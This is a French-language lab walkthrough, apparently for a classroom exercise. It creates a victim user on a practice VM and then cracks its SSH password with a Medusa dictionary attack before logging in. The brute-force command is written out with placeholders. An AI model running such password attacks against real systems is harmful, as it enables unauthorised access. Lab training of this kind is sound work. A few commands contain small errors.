Machine : Victime
Étape 1 :
Se connecter à la VM de la cible
  1. Ouvrir CMD (Invite de commande)
  2. Entrer la commande
    C:\Users\utilisateur>
    ssh [utilisateur]@[adresse IP] -p [numérodeport]
  3. Appuyer sur 'y' pour confirmer
  4. Écrire le mot de passe
Étape 2 :
Créer l'utilisateur victime
  1. Choisir un mot de passe dans la liste des mots de passe
  2. Créer l'utilisateur avec la commande suivante
    utilisateur@victime:~$
    sudo adduser [nomDeLaVictime]
  3. Inscrire le mot de passe.
    ATTENTION: On ne voit pas ce que l'on écrit
Étape 3 :
Se connecter avec le nouvel utilisateur
  1. Entrer la commande
    utilisateur@victime:~$
    su [nomDeLaVictime]
  2. Entrer le mot de passe que vous avez choisi à l'étape précédente
Étape 4 :
Créer un fichier texte
  1. Vérifier notre emplacement dans la VM
    cible@victime:~$ pwd
    ou
    cible@victime:~$ cd/home/[nomDeLaVictime]
    Nous devons être : !!!!!!!!!!
  2. Créer un fichier texte avec une phrase secrète
    cible@victime:~$
    nano reponse.txt
     Fermer le fichier: Ctrl + x ,
     Appuyer sur 'y' pour confirmer
     Puis, appuyer sur ENTRER
Machine : Attaque
Étape 5 :
Se connecter a l'attaque
  1. Ouvrir un autre CMD (Invite de commande)
  2. Executer la commande suivante
    C:\User\exemple>
    ssh [utilisateur]@[adresse IP] -p [numéro de port]
  3. Appuyer sur 'y' pour confirmer
  4. Entrer le mot de passe
Étape 6 :
Preparer l'attaque
  1. Afficher le dictionnaire (la liste de mots de passe)
    user@attaque:~$ cat Dictionnaire/dictionnaire.txt
  2. Déterminer l'adresse de la victime !!!!!!!
  3. Executer la commande suivante
    C:\Users\exemple>
    ping [adresse IP]
Étape 7 :
Lancer l'attaque
  1. Executer la commande suivante
    user@superhéros:~$
    medusa -h [adresseIP] -u [nomVictime] -p /dictionnaire/dictionnaire.txt -n [numérodeport] -M ssh -v 6
Étape 8 :
Se connecter à la victime
  1. Se connecter à la victime
    user@superhéros:~$
    ssh [victime]@adresseIP -p [numérodeportDeLaVictime]
  2. Verifier l'utilisateur et la Machine

    whoami -u
